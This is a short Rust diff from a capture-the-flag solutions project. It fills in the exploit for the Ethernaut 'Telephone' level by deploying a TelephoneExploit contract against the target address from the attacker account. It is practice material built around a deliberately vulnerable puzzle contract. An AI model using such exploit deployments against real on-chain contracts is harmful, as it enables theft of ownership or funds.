@@ -1,3 +1,4 @@
+use crate::abi::telephone_exploit::TelephoneExploit;
 use async_trait::async_trait;
 use ctf::ethernaut::lvl04_telephone::*;
 
@@ -27,6 +28,10 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        TelephoneExploit::deploy(offender.to_owned(), target.address)?
+            .send()
+            .await?;
+
         Ok(())
     }
 }
